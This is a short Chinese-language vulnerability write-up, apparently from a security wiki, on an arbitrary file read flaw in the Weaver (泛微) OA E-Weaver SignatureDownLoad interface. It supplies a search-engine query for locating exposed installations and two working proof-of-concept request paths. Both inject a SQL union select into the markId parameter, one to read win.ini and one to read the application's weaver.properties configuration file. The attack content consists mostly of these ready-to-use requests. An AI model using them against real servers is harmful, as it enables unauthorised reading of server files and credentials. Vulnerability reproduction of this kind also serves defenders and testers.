---
title: "泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞"
date: 2026-10-17 09:12:39
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

泛微OA E-Weaver SignatureDownLoad接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

## 漏洞影响

泛微OA E-Weaver

## 网络测绘

```
app="泛微-E-Weaver"
```

## 漏洞复现

![image-20220706133659005](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207061336151.png)

验证POC

```
/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27
```

![image-20220706133707852](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207061337908.png)

```
/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
```

![image-20220706133717202](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202207061337932.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Weaver-SignatureDownLoad-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
